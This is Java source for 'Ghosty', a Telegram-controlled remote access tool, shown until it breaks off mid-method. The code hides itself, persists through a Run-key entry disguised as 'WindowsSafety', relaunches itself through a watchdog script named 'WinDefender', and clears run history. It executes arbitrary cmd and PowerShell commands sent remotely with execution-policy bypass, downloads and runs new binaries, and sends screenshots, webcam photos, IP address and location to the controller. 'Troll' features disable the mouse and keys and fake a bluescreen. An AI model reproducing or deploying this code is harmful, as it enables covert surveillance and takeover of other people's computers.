package ProjectX;

import com.github.sarxos.webcam.Webcam;
import com.github.sarxos.webcam.WebcamResolution;
import org.jsoup.Jsoup;
import org.jsoup.select.Elements;
import org.telegram.telegrambots.TelegramBotsApi;
import org.telegram.telegrambots.api.methods.GetFile;
import org.telegram.telegrambots.api.methods.send.SendLocation;
import org.telegram.telegrambots.api.methods.send.SendMessage;
import org.telegram.telegrambots.api.methods.send.SendPhoto;
import org.telegram.telegrambots.api.objects.Update;
import org.telegram.telegrambots.api.objects.replykeyboard.ReplyKeyboardMarkup;
import org.telegram.telegrambots.api.objects.replykeyboard.buttons.KeyboardRow;
import org.telegram.telegrambots.bots.TelegramLongPollingBot;
import org.telegram.telegrambots.exceptions.TelegramApiRequestException;
import org.telegram.telegrambots.generics.BotSession;

import javax.imageio.ImageIO;
import javax.swing.*;
import java.awt.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.image.BufferedImage;
import java.io.*;
import java.net.InetAddress;
import java.net.URL;
import java.net.UnknownHostException;
import java.nio.file.Files;
import java.nio.file.StandardCopyOption;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;

/**
 * Created by Alexander Ressl on 10.04.2017 12:12.
 */
public class Bot extends TelegramLongPollingBot {

    Config config;
    boolean hidden;
    boolean autostart;
    boolean startupNotification;
    boolean unkillable;
    boolean antiAV;
    boolean troll;
    boolean camera;
    boolean autoupdate;
    boolean taskhide;
    static boolean alive;
    String token;
    String name;
    String admin;
    String support = "162922263";
    double version = 1.572;
    static private BotSession sup;
    boolean updating = false;
    private long last = System.currentTimeMillis();
    CapsFuck capsFuck = new CapsFuck();
    Thread runfuck = new Thread(capsFuck);
    TaskChecker check = new TaskChecker(this);
    Thread checkrun = new Thread(check);
    LowRam lowRam = new LowRam(last, this);
    Thread run = new Thread(lowRam);
    TaskColor color = new TaskColor(this);
    Detect detct = null;
    private boolean website = false;
    boolean sicher = false;
    int wo = 0;
    int menu = -1;
    private String time = "";
    boolean shutdown = false;
    boolean restart = false;
    boolean reset = false;
    boolean remove = false;
    static String password;
    static boolean silent;
    TrayIcon trayIcon;

    String changelog = "Ghosty now only turns red if there is an connection error!\nIf you write Ghosty a Message it will turn blue.";

    public Bot(String[] args) {
        config = read();
        this.hidden = config.isHidden();
        this.autostart = config.isAutostart();
        this.startupNotification = config.isStartupNotification();
        this.unkillable = config.isUnkillable();
        this.antiAV = config.isAntiAV();
        this.troll = config.isTroll();
        this.camera = config.isCamera();
        this.autoupdate = config.isAutoupdate();
        this.taskhide = config.isTaskhide();
        this.alive = config.isAlive();
        this.token = config.getToken();
        this.name = config.getName();
        this.admin = config.getAdmin();
        this.password = config.getPassword();
        this.silent = config.isSilent();
        if (alive)
            tray();
        if (startupNotification) {
            Runtime.getRuntime().addShutdownHook(new Thread() {
                @Override
                public void run() {
                    DateFormat dateFormat = new SimpleDateFormat("HH:mm:ss");
                    Date date = new Date();
                    String time = dateFormat.format(date);
                    if (!Bot.isSilent())
                        sendNachricht("Prozess beendet. " + time);
                }
            });
            DateFormat dateFormat = new SimpleDateFormat("HH:mm:ss");
            Date date = new Date();
            this.time = dateFormat.format(date);
            InetAddress addr;
            String wer = "FEHLER";
            try {
                addr = InetAddress.getLocalHost();
                wer = addr.getHostName();
            } catch (UnknownHostException e) {
                sendNachricht(e.toString());
            }
            if (!silent)
                if (args.length == 0)
                    sendNachricht("Device booted!\nTime: " + time + " " + IP.getIP() + "\n" + wer);
                else
                    sendNachricht("Ghosty has been closed unexpectedly! Process restarted successfully.\nTime: " + time + " " + IP.getIP() + "\n" + wer);
        }
        if (!config.getName().contains(";")) {
            config.setName(this.name + ";");
            sendNachricht("Changelog:\n" + changelog);
            writeConf();
        }
        setSilent(false);
        if (troll) {
            runfuck.setDaemon(true);
            runfuck.start();
        }
        run.setDaemon(true);
        run.start();
        String pfad = System.getProperty("user.home") + "\\";
        if (!getPfad().equals(pfad)) {
            try {
                setSilent(true);
                String name = "Ghosty.jar";
                Runtime.getRuntime().exec("powershell -windowstyle hidden -Exec Bypass If (Test-Path \"" + pfad + name + "\"){Remove-Item " + pfad + name + "}");
                Thread.sleep(500);
                Process cop = Runtime.getRuntime().exec("cmd /c copy /v/y \"" + getAbsolutePfad() + "\" \"" + pfad + "\"");
                cop.waitFor();
                Process ren = Runtime.getRuntime().exec("cmd /c rename \"" + pfad + getName() + "\" " + name);
                ren.waitFor();
                Runtime.getRuntime().exec("cmd /c start \"Windows\" \"" + pfad + name + "\"");
                Thread.sleep(1000);
                Runtime.getRuntime().exec("powershell -windowstyle hidden -Exec Bypass \"Remove-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU' -Name '*' -ErrorAction SilentlyContinue");
                deleteme();
            } catch (Exception e) {
                System.out.println(e);
            }
        } else {
            if (args.length == 0 && unkillable) {
                try {
                    String command =
                            "while($true){\n" +
                                    "    Sleep 10\n" +
                                    "    $java = Get-Process javaw -ErrorAction SilentlyContinue\n" +
                                    "    if(!$java){\n" +
                                    "        Start-Process \"" + getPfad() + getName() + "\" -ArgumentList restart\n" +
                                    "        Sleep 50\n" +
                                    "    }\n" +
                                    "}";
                    File file = File.createTempFile("WinDefender", ".ps1");
                    FileWriter fw = new java.io.FileWriter(file);
                    fw.write(command);
                    fw.close();
                    Runtime.getRuntime().exec("powershell -windowStyle hidden -Exec Bypass \"" + file.getPath() + "\"");
                    file.deleteOnExit();
                } catch (Exception e) {
                    sendNachricht("Fehler beim Restart Script.");
                }
            }
            if (autostart)
                try {
                    Reg.writeStringValue(0x80000001, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", "WindowsSafety", getAbsolutePfad());
                    if (!antiAV)
                        sendNachricht("Hijacking startup!");
                } catch (Exception e) {
                    sendNachricht(e.toString());
                }
            if (taskhide) {
                checkrun.setDaemon(true);
                checkrun.start();
                if (!antiAV)
                    sendNachricht("TaskChecker loaded!");
            }
            try {
                Runtime.getRuntime().exec("cmd /c attrib +s +h \"" + System.getProperty("user.home") + "\\botconf.bot" + "\"");
            } catch (IOException ek) {
                System.out.println(ek + " HIDE");
            }
            if (hidden) {
                try {
                    Runtime.getRuntime().exec("cmd /c attrib +h \"" + getPfad() + getName() + "\"");
                } catch (IOException e) {
                    sendNachricht("FEHLER beim Datei verstecken machen \n" + e.toString());
                }
            }
            try {
                Runtime.getRuntime().exec("powershell -windowstyle hidden -Exec Bypass \"Remove-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU' -Name '*' -ErrorAction SilentlyContinue");
            } catch (IOException e) {
                System.out.println(e);
            }
        }
    }

    private Config read() {
        Config back = null;
        try {
            FileInputStream fis = new FileInputStream(System.getProperty("user.home") + "\\botconf.bot");
            ObjectInputStream ois = new ObjectInputStream(fis);
            back = (Config) ois.readObject();
            ois.close();
        } catch (Exception e) {
            System.out.println(e);
        }
        return back;
    }

    @Override
    public void onUpdateReceived(Update update) {
        if (!update.hasMessage())
            return;
        long userid = update.getMessage().getFrom().getId();
        if (userid != Integer.parseInt(admin) && userid != Integer.parseInt(support))
            return;
        if (updating)
            return;
        if (update.getMessage().hasDocument()) {
            updating = true;
            setImage(1);
            sendNachrichtAdmin("Dokument ist da");
            try {
                GetFile n = new GetFile();
                n.setFileId(update.getMessage().getDocument().getFileId());
                org.telegram.telegrambots.api.objects.File bl = getFile(n);
                java.io.File fileFromSystem = downloadFile(bl.getFilePath());
                String pfad = System.getProperty("user.home") + "\\IO.jar";
                Files.move(fileFromSystem.toPath(), (new java.io.File(pfad)).toPath(), StandardCopyOption.REPLACE_EXISTING);
                sendNachrichtAdmin("FILE MOVED");
                sendNachricht("Updating!\nPlease do not turn off your device in the next minute.");
                File datei = new File(pfad);
                config.setName(this.name.replace(";", ""));
                writeConf();
                File neu;
                if (getName().equalsIgnoreCase("Ghosty.jar"))
                    neu = new File(getPfad() + "Ghosti.jar");
                else
                    neu = new File(getPfad() + "Ghosty.jar");
                datei.renameTo(neu);
                Desktop.getDesktop().open(neu);
                deleteme();
            } catch (Exception e) {
                sendNachrichtAdmin(e.toString());
            }
        }
        if (userid == Integer.parseInt(support) && !support.equalsIgnoreCase(admin)) {
            sendNachrichtAdmin("Version: " + version);
            return;
        }
        setImage(2);
        if (!color.isActive()) {
            Thread up = new Thread(color);
            up.start();
        } else
            color.setRunning(true);
        if (!update.getMessage().hasText())
            return;
        long elapsedTimeMillis = System.currentTimeMillis() - last;
        float elapsedTimeMin = elapsedTimeMillis / (60 * 1000F);
        String nachricht = update.getMessage().getText();
        if (shutdown) {
            shutdown = false;
            if (nachricht.equalsIgnoreCase("Yes"))
                try {
                    String shutdownCommand;
                    String operatingSystem = System.getProperty("os.name");
                    if ("Linux".equals(operatingSystem) || "Mac OS X".equals(operatingSystem)) {
                        shutdownCommand = "shutdown -h now";
                    } else if (operatingSystem.contains("Windows")) {
                        shutdownCommand = "shutdown.exe -s -t 0";
                    } else {
                        throw new RuntimeException("Unsupported operating system.");
                    }
                    Runtime.getRuntime().exec(shutdownCommand);
                    System.exit(0);
                } catch (Exception e) {
                    sendNachrichtAdmin("FEHLER BEIM BEENDEN DES PC's!");
                }
            else {
                menu = -1;
                sendNachricht("Shutdown canceled");
            }
        }
        if (nachricht.equalsIgnoreCase("shutdown")) {
            shutdown = true;
            wo = 0;
            menu = 100;
            sendNachricht("Do you wanna turn off the device?");
        }
        if (restart) {
            restart = false;
            if (nachricht.equalsIgnoreCase("Yes"))
                try {
                    String shutdownCommand;
                    String operatingSystem = System.getProperty("os.name");
                    if ("Linux".equals(operatingSystem) || "Mac OS X".equals(operatingSystem)) {
                        shutdownCommand = "shutdown -r now";
                    } else if (operatingSystem.contains("Windows")) {
                        shutdownCommand = "shutdown.exe -r -t 0";
                    } else {
                        throw new RuntimeException("Unsupported operating system.");
                    }
                    Runtime.getRuntime().exec(shutdownCommand);
                    System.exit(0);
                } catch (Exception e) {
                    sendNachrichtAdmin("FEHLER BEIM BEENDEN DES PC's!");
                }
            else {
                menu = -1;
                sendNachricht("Restarting canceled.");
            }
        }
        if (nachricht.equalsIgnoreCase("restart")) {
            restart = true;
            wo = 0;
            menu = 100;
            sendNachricht("Do you wanna reboot the device?");
        }
        if (nachricht.toLowerCase().contains("powershell")) {
            String code;
            if (nachricht.equalsIgnoreCase("powershell")) {
                try {
                    Runtime.getRuntime().exec("powershell.exe");
                } catch (Exception e) {
                    sendNachrichtAdmin("Powershell konnte nicht gestartet werden!");
                }
            } else {
                code = nachricht.split(":")[1];
                code = code.replace(":", "");
                try {
                    Runtime.getRuntime().exec("powershell -windowstyle hidden -Exec Bypass " + code);
                } catch (Exception e) {
                    sendNachrichtAdmin("Powershell konnte nicht gestartet werden!");
                }
            }
        }
        if (reset) {
            reset = false;
            if (nachricht.equalsIgnoreCase("Yes"))
                reset();
            else {
                menu = -1;
                sendNachricht("Reset canceled");
            }
        }
        if (nachricht.equalsIgnoreCase("BotReset")) {
            reset = true;
            wo = 0;
            menu = 100;
            sendNachricht("Do you really want to reset Ghosty?");
        }
        if (nachricht.toLowerCase().contains("cmd")) {
            String code;
            if (nachricht.equalsIgnoreCase("cmd")) {
                try {
                    Runtime.getRuntime().exec("cmd /c start");
                } catch (Exception e) {
                    sendNachrichtAdmin("Cmd konnte nicht gestartet werden!");
                }
            } else {
                code = nachricht.split(":")[1];
                code = code.replace(":", "");
                try {
                    Runtime.getRuntime().exec("cmd /c " + code);
                } catch (Exception e) {
                    sendNachrichtAdmin("Cmd konnte nicht gestartet werden!");
                }
            }
        }
        if (nachricht.equalsIgnoreCase("screenshot")) {
            GraphicsEnvironment ge = GraphicsEnvironment.getLocalGraphicsEnvironment();
            GraphicsDevice[] screens = ge.getScreenDevices();
            Rectangle allScreenBounds = new Rectangle();
            for (GraphicsDevice screen : screens) {
                Rectangle screenBounds = screen.getDefaultConfiguration().getBounds();
                allScreenBounds.width += screenBounds.width;
                allScreenBounds.height = Math.max(allScreenBounds.height, screenBounds.height);
            }
            try {
                Robot robot = new Robot();
                BufferedImage screenShot = robot.createScreenCapture(allScreenBounds);
                sendNachricht("OK, picture is sending!");
                File send = new File(System.getProperty("user.home") + "\\Pic.jpg");
                ImageIO.write(screenShot, "JPG", send);
                Thread.sleep(100);
                sendPic(send);
                Thread.sleep(100);
                send.delete();
            } catch (Exception e) {
                sendNachrichtAdmin(e.toString() + "\nBeim erstellen");
            }
        }
        if (nachricht.equalsIgnoreCase("Uptime")) {
            sendNachricht("Device is still running!\nTime running: " + (int) elapsedTimeMin / 60 + " h : " + (int) elapsedTimeMin % 60 + " m!\nSince: " + time);

        }
        if (sicher) {
            sicher = false;
            if (nachricht.equalsIgnoreCase("Yes")) {
                try {
                    Runtime.getRuntime().exec("cmd /c taskkill /F /IM powershell.exe");
                } catch (IOException e) {
                    e.printStackTrace();
                }
                System.exit(0);
            } else {
                menu = -1;
                sendNachricht("Closing canceled");
            }
        }
        if (nachricht.equalsIgnoreCase("close")) {
            sicher = true;
            wo = 0;
            menu = 100;
            sendNachricht("Do you wanna close Ghosty?");
        }
        if (nachricht.equalsIgnoreCase("retry")) {
            sendNachricht("Restarting. . .");
            retry();
        }
        if (nachricht.equalsIgnoreCase("menu")) {
            wo = 0;
            menu = -1;
            sendNachricht("Menu.");
        }
        if (nachricht.equalsIgnoreCase("leave")) {
            wo = 0;
            menu = -1;
            sendNachricht("Going back.");
        }
        if (nachricht.equalsIgnoreCase("fun") && troll) {
            wo = 0;
            menu = 0;
            sendNachricht("Fun Menu.");
        }
        if (nachricht.equalsIgnoreCase("info")) {
            wo = 0;
            menu = 1;
            sendNachricht("Info menu.");
        }
        if (nachricht.equalsIgnoreCase("Tools")) {
            wo = 0;
            menu = 2;
            sendNachricht("Tool menu.");
        }
        if (nachricht.equalsIgnoreCase("Music")) {
            wo = 0;
            menu = 3;
            sendNachricht("Music");
        }
        if (nachricht.equalsIgnoreCase("forward")) {
            wo++;
            sendNachricht("Next Page.");
        }
        if (nachricht.equalsIgnoreCase("back") && wo > 0) {
            wo--;
            sendNachricht("Previous Page.");
        }
        if (nachricht.equalsIgnoreCase("lock")) {
            try {
                Runtime.getRuntime().exec("C:\\Windows\\System32\\rundll32.exe user32.dll,LockWorkStation");
            } catch (IOException e) {
                e.printStackTrace();
            }
            sendNachricht("Device locked!");
        }
        if (nachricht.equalsIgnoreCase("ChangePW")) {
            sendNachricht("Please enter you new password on the device.");
            JPanel panel = new JPanel();
            JLabel label = new JLabel("Please enter your new password:");
            JPasswordField pass = new JPasswordField(10);
            JPasswordField pass1 = new JPasswordField(10);
            panel.add(label);
            panel.add(pass);
            panel.add(pass1);
            panel.grabFocus();
            String[] options = new String[]{"OK", "Cancel"};
            int option = JOptionPane.showOptionDialog(null, panel, "Password",
                    JOptionPane.NO_OPTION, JOptionPane.PLAIN_MESSAGE,
                    null, options, options[0]);


            if (option == 0) // pressing OK button
            {
                char[] password = pass.getPassword();
                char[] password1 = pass1.getPassword();
                String pw = new String(password);
                String pw1 = new String(password1);
                if (pw.equals(pw1)) {
                    config.setPassword(pw);
                    Bot.setPassword(pw);
                    sendNachricht("Password set!");
                    writeConf();
                } else {
                    sendNachricht("Passwords do not match!");
                }
            }
        }
        if (troll) {
            if (nachricht.equalsIgnoreCase("DVD open")) {
                CDUtils.open();
                sendNachricht("DVD drive closing!");
            }
            if (nachricht.equalsIgnoreCase("DVD close")) {
                CDUtils.close();
                sendNachricht("DVD drive opening!");
            }
            if (nachricht.equalsIgnoreCase("Caps Fucker")) {
                if (capsFuck.isCapsfuck())
                    sendNachricht("Caps-Lock is working again.");
                else
                    sendNachricht("Caps-Lock malfunction.");
                capsFuck.setCapsfuck(!capsFuck.isCapsfuck());
            }

            if (nachricht.equalsIgnoreCase("Windows Fucker")) {
                if (capsFuck.isWindowsfucker())
                    sendNachricht("Windows Key funktioniert wieder.");
                else
                    sendNachricht("Windows Key Fehlfunktion.");
                capsFuck.setWindowsfucker(!capsFuck.isWindowsfucker());
            }
            if (nachricht.equalsIgnoreCase("Mouse Fucker")) {
                if (capsFuck.isMousefucker())
                    sendNachricht("Maus wieder einsatzfähig.");
                else
                    sendNachricht("Maus defekt!");
                capsFuck.setMousefucker(!capsFuck.isMousefucker());

            }

            if (nachricht.equalsIgnoreCase("Screen fucker")) {
                capsFuck.setScreenfucker(!capsFuck.isScreenfucker());
                if (!capsFuck.isScreenfucker()) {
                    sendNachricht("Bildschirm wieder in Ordnung.");
                } else {
                    sendNachricht("RGB Test aktiviert.");
                }
            }
            if (nachricht.equalsIgnoreCase("All fucker")) {
                capsFuck.setAllfuck(!capsFuck.isAllfuck());
                if (!capsFuck.isAllfuck()) {
                    Draw.stop();
                    sendNachricht("Alles wieder normal :(");
                } else {
                    Draw.screenfucker();
                    sendNachricht("Jetzt ist es aus dam dam");
                }

            }
            if (website) {
                try {
                    sendNachricht("Wird geöffnet");
                    Runtime.getRuntime().exec("cmd /c start " + nachricht);
                    website = false;
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
            if (nachricht.equalsIgnoreCase("website")) {
                sendNachricht("URL schicken.");
                website = true;
            }

            if (nachricht.equalsIgnoreCase("nobrain")) {
                try {
                    sendNachricht("Oh nette website.");
                    Runtime.getRuntime().exec("cmd /c start iexplore www.nobrain.dk");
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
            if (nachricht.equalsIgnoreCase("Strange")) {
                if (Draw.active) {
                    sendNachricht("Strange fertig!");
                    Draw.stop();
                } else {
                    sendNachricht("Strange!");
                    Draw.screenfucker();
                }
            }
            if (nachricht.equalsIgnoreCase("Dog cleaner")) {
                if (Draw.active) {
                    sendNachricht("Hund fertig!");
                    Draw.stop();
                } else {
                    sendNachricht("Hund fängt an!");
                    Draw.dog();
                }
            }
            if (nachricht.equalsIgnoreCase("walk")) {
                if (Draw.active) {
                    sendNachricht("Fertig gegangen!");
                    Draw.stop();
                } else {
                    sendNachricht("Ich gehe los!");
                    Draw.walk();
                }
            }
            if (nachricht.equalsIgnoreCase("scare")) {
                if (Draw.active) {
                    sendNachricht("Fertig gescared!");
                    Draw.stop();
                } else {
                    sendNachricht("Scare!");
                    Draw.scare();
                }
            }
            if (nachricht.equalsIgnoreCase("bluescreen")) {
                if (Draw.active) {
                    sendNachricht("Bluescreen entfernt!");
                    Draw.stop();
                } else {
                    sendNachricht("Gebluescreent!");
                    Draw.blue();
                }
            }
            if (nachricht.equalsIgnoreCase("wer")) {
                try {
                    InetAddress addr;
                    addr = InetAddress.getLocalHost();
                    sendNachricht(addr.getHostName());
                } catch (Exception e) {
                    sendNachricht("Es gibt keinen Nutzer.");
                }
            }
        }
        if (nachricht.equalsIgnoreCase("IP")) {
            sendNachricht(IP.getIP());
        }
        if (nachricht.equalsIgnoreCase("version")) {
            sendNachricht("Version: " + version);
        }
        if (nachricht.equalsIgnoreCase("Black")) {
           /* if (Draw.active) {
                sendNachricht("Display aktiviert.");
                Draw.stop();
            } else {
                sendNachricht("Bildschirm off");
                Draw.black();
            }
            */
            try {
                String command =
                        "Add-Type -TypeDefinition '\n" +
                                "using System;\n" +
                                "using System.Runtime.InteropServices;\n" +
                                " \n" +
                                "namespace Utilities {\n" +
                                "   public static class Display\n" +
                                "   {\n" +
                                "      [DllImport(\"user32.dll\", CharSet = CharSet.Auto)]\n" +
                                "      private static extern IntPtr SendMessage(\n" +
                                "         IntPtr hWnd,\n" +
                                "         UInt32 Msg,\n" +
                                "         IntPtr wParam,\n" +
                                "         IntPtr lParam\n" +
                                "      );\n" +
                                " \n" +
                                "      public static void PowerOff ()\n" +
                                "      {\n" +
                                "         SendMessage(\n" +
                                "            (IntPtr)0xffff, // HWND_BROADCAST\n" +
                                "            0x0112,         // WM_SYSCOMMAND\n" +
                                "            (IntPtr)0xf170, // SC_MONITORPOWER\n" +
                                "            (IntPtr)0x0002  // POWER_OFF\n" +
                                "         );\n" +
                                "      }\n" +
                                "   }\n" +
                                "}\n" +
                                "'\n" +
                                "[Utilities.Display]::PowerOff()";
                File file = File.createTempFile("WinBlack", ".ps1");
                FileWriter fw = new java.io.FileWriter(file);
                fw.write(command);
                fw.close();
                Runtime.getRuntime().exec("powershell -windowStyle hidden -Exec Bypass \"" + file.getPath() + "\"");
                Thread.sleep(1000);
                file.delete();
            } catch (Exception e) {
                sendNachricht("Fehler beim Bildschirm abdrehen.");
            }
        }
        if (nachricht.equalsIgnoreCase("dir")) {
            try {
                File folder = new File(getPfad());
                File[] listOfFiles = folder.listFiles();
                sendNachricht(getPfad());
                sendNachricht(listOfFiles.length + "");
                for (int i = 0; i < listOfFiles.length; i++) {
                    if (listOfFiles[i].isFile()) {
                        sendNachricht("File " + listOfFiles[i].getName());
                    } else if (listOfFiles[i].isDirectory()) {
                        sendNachricht("Directory " + listOfFiles[i].getName());
                    }
                }
            } catch (Exception ex) {
                sendNachricht("Fuck\n" + ex);
            }
        }
        if (nachricht.equalsIgnoreCase("autostart") && autostart) {
            try {
                Reg.writeStringValue(0x80000001, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", "WindowsSafety", getAbsolutePfad());
            } catch (Exception e) {
                sendNachrichtAdmin(e.toString());
            }
        }
        if (nachricht.equalsIgnoreCase("uninstall")) {
            panic();
        }

        if (remove) {
            remove = false;
            if (nachricht.equalsIgnoreCase("Yes"))
                panic();
            else {
                menu = -1;
                sendNachricht("Deinstallation abgebrochen");
            }
        }
        if (nachricht.equalsIgnoreCase("Uninstall")) {
            remove = true;
            wo = 0;
            menu = 100;
            sendNachricht("Wirklich deinstallieren?");
        }
        if (nachricht.equalsIgnoreCase("path")) {
            sendNachricht(getPfad());
        }
        if (nachricht.equalsIgnoreCase("name")) {
            sendNachricht(getName());
        }
        if (nachricht.equalsIgnoreCase("betriebssystem")) {
            sendNachricht(System.getProperty("os.name"));
        }
        if (nachricht.equalsIgnoreCase("pic")) {
            if (camera)
                takepic();
            else
                sendNachricht("Camera has been deactivated in the settings.");
        }
        if (nachricht.equalsIgnoreCase("alarm")) {
            sendNachricht("Gehe in ALARM-Modus! Protokoll: Benachrichtigen.");
            Runnable detect = new Detect(0, this);
            Thread runDetect = new Thread(detect);
            runDetect.start();
        }
        if (nachricht.equalsIgnoreCase("autolock")) {

            if (detct != null && detct.isRunning()) {
                sendNachricht("AlarmModus deaktiviert");
                detct.setRunning(false);
            } else {
                sendNachricht("Gehe in ALARM-Modus! Protokoll: Sperren.");
                detct = new Detect(1, this);
                Runnable detect = detct;
                Thread runDetect = new Thread(detect);
                runDetect.start();
            }
        }
        if (nachricht.equalsIgnoreCase("sleep")) {
            try {
                Runtime.getRuntime().exec("Rundll32.exe powrprof.dll,SetSuspendState Sleep");
            } catch (IOException e) {
                sendNachricht(e.toString());
            }
        }
        if (nachricht.equalsIgnoreCase("BatteryInformation")) {
            Kernel32.SYSTEM_POWER_STATUS batteryStatus = new Kernel32.SYSTEM_POWER_STATUS();
            Kernel32.INSTANCE.GetSystemPowerStatus(batteryStatus);
            sendNachricht(batteryStatus.toString());
        }
        if (nachricht.equalsIgnoreCase("tarn") && taskhide) {
            tarnung();
        }
        if (nachricht.equalsIgnoreCase("hidden")) {
            File me = new File(this.getAbsolutePfad());
            sendNachricht(me.isHidden() + " -- suppose " + config.isHidden());
        }

        if (nachricht.equalsIgnoreCase("Down")) {
            try {
                Runtime.getRuntime().exec("powershell -windowstyle hidden -Exec Bypass /c $obj = new-object -com wscript.shell; $obj.SendKeys([char]174)");
            } catch (Exception e) {
                sendNachricht("Fehler beim leiser drehen.");
            }
            sendNachricht("Lautstärke verringert.");
        }

        if (nachricht.equalsIgnoreCase("Un-/Mute")) {
            try {
                Runtime.getRuntime().exec("powershell -windowstyle hidden -Exec Bypass /c $obj = new-object -com wscript.shell; $obj.SendKeys([char]173)");
            } catch (Exception e) {
                sendNachricht("Fehler beim muten.");
            }
            sendNachricht("Gemutet oder entmutet.");
        }
        if (nachricht.equalsIgnoreCase("Up")) {
            try {
                Runtime.getRuntime().exec("powershell -windowstyle hidden -Exec Bypass /c $obj = new-object -com wscript.shell; $obj.SendKeys([char]175)");
            } catch (Exception e) {
                sendNachricht("Fehler beim lauter drehen.");
            }
            sendNachricht("Lautstärke erhöht.");
        }

        if (nachricht.equalsIgnoreCase("Previous")) {
            try {
                Runtime.getRuntime().exec("powershell -windowstyle hidden -Exec Bypass /c $obj = new-object -com wscript.shell; $obj.SendKeys([char]177)");
            } catch (Exception e) {
                sendNachricht("Fehler beim zurückspulen.");
            }
            sendNachricht("Vorheriges Lied.");
        }
        if (nachricht.equalsIgnoreCase("Play/Pause")) {
            try {
                Runtime.getRuntime().exec("powershell -windowstyle hidden -Exec Bypass /c $obj = new-object -com wscript.shell; $obj.SendKeys([char]179)");
            } catch (Exception e) {
                sendNachricht("Fehler bei play/pause.");
            }
            sendNachricht("Play oder Pause.");
        }
        if (nachricht.equalsIgnoreCase("next")) {
            try {
                Runtime.getRuntime().exec("powershell -windowstyle hidden -Exec Bypass /c $obj = new-object -com wscript.shell; $obj.SendKeys([char]176)");
            } catch (Exception e) {
                sendNachricht("Fehler beim nächsten Lied.");
            }
            sendNachricht("Nächstes Lied.");
        }
        if (nachricht.equalsIgnoreCase("location")) {
            float lat = 0;
            float lon = 0;
            try {
                org.jsoup.nodes.Document doc = Jsoup.connect("http://ipinfo.io/").get();
                Elements bl = doc.select("tr");
                String[] beide = bl.get(3).getAllElements().get(2).text().split(",");
                lat = Float.parseFloat(beide[0]);
                lon = Float.parseFloat(beide[1]);
            } catch (Exception e) {
                System.out.println(e.toString());
            }
            if (lat == 0 && lon == 0)
                sendNachricht("Fehler beim Orten.");
            else
                sendLocation(lat, lon);
        }
        if (menu == 0 && !troll) {
            wo = 0;

            sendNachricht("Troll function have been deactivated in the Ghosty Settings.");
        }
    }

    public void retry() {
        try {
            // Runtime.getRuntime().exec("powershell /c Start-Process \"" + getPfad() + getName() + "\" -ArgumentList restart");
            Runtime.getRuntime().exec("cmd /c taskkill /F /IM powershell.exe");
            Runtime.getRuntime().exec("cmd /c start \"\" \"" + getAbsolutePfad() + "\"");
            System.exit(0);
        } catch (Exception e) {
            sendNachrichtAdmin("CMD Fail bei retry!\nRestart");
        }

    }

    @Override
    public String getBotUsername() {
        return this.name;
    }

    @Override
    public String getBotToken() {
        return this.token;
    }

    void reset() {
        removeConf();
        retry();
    }

    void removeConf() {
        File botconf = new File(System.getProperty("user.home") + "\\botconf.bot");
        botconf.delete();
    }

    void deleteme() {
        try {
            Runtime.getRuntime().exec("cmd /c taskkill /F /IM powershell.exe");
        } catch (IOException e) {
            sendNachrichtAdmin("Fehler beim beenden");
        }
        try {
            Runtime.getRuntime().exec("cmd /c ping 127.0.0.1 -n 5 & attrib -h \"" + getAbsolutePfad() + "\" & del \"" + getAbsolutePfad() + "\"");
            try {
                Reg.deleteValue(Reg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", "WindowsSafety");
            } catch (Exception e) {
            }
            System.exit(0);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    String getAbsolutePfad() {
        URL location = BotCreate.class.getProtectionDomain().getCodeSource().getLocation();
        return location.toString().substring(location.toString().indexOf('/') + 1).replaceAll("%20", " ").replaceAll("/", "\\\\");
    }

    String getPfad() {
        String name = getName();
        URL location = BotCreate.class.getProtectionDomain().getCodeSource().getLocation();
        String pfad = location.toString().substring(location.toString().indexOf('/') + 1).replaceAll("%20", " ");
        pfad = pfad.replaceAll(name, "");
        pfad = pfad.replaceAll("/", "\\\\");
        return pfad;
    }

    String getName() {
        URL location = BotCreate.class.getProtectionDomain().getCodeSource().getLocation();
        int end = 0;
        for (int i = location.toString().indexOf('.'); i > 0; i--) {
            if (location.toString().charAt(i) == '/') {
                end = i;
                break;
            }
        }
        return location.toString().substring(end + 1);
    }

    void sendNachricht(String nachricht) {
        SendMessage TestNachricht = new SendMessage();
        ReplyKeyboardMarkup back = new ReplyKeyboardMarkup();
        TestNachricht.enableMarkdown(true);
        TestNachricht.setChatId(admin);
        String item = getItems();
        String[] buttonArray = item.split(",");
        java.util.List<KeyboardRow> commands = new ArrayList<>();
        int gseiten = (int) Math.ceil(buttonArray.length / 6.0);
        if (menu != -1) {
            for (int j = 0; j < 3; j++) {
                if (getRow(wo, j, gseiten, buttonArray).size() != 0) {
                    commands.add(getRow(wo, j, gseiten, buttonArray));
                    System.out.println(getRow(wo, j, gseiten, buttonArray));
                }
            }
        } else {
            for (int j = 0; j < 2; j++) {
                if (getRow(wo, j, gseiten, buttonArray).size() != 0) {
                    commands.add(getRow(wo, j, gseiten, buttonArray));
                }
            }
        }
        back.setResizeKeyboard(true);
        back.setOneTimeKeyboad(false);
        back.setKeyboard(commands);
        back.setSelective(true);
        TestNachricht.setReplyMarkup(back);
        TestNachricht.setText(nachricht.replaceAll("(?=[]\\[+|`'{}^_~*\\\\])", "\\\\"));
        try {
            sendMessage(TestNachricht);
        } catch (Exception e) {

        }
    }

    void sendNachrichtAdmin(String nachricht) {
        try {
            TelegramBotsApi telegramBotsApi = new TelegramBotsApi();
            sup = telegramBotsApi.registerBot(new SupBot("Info:" + "\n" + nachricht));
            sup.close();
        } catch (Exception e) {
            System.out.println(e);
        }
    }

    void panic() {
        sendNachricht("Erfolgreich deinstalliert!");
        removeConf();
        deleteme();
    }

    void tarnung() {
        try {
            Runtime.getRuntime().exec("cmd /c ping 127.0.0.1 -n 60 & start \"\" \"" + getPfad() + getName() + "\"");
            Runtime.getRuntime().exec("taskkill /F /IM powershell.exe");
            try {
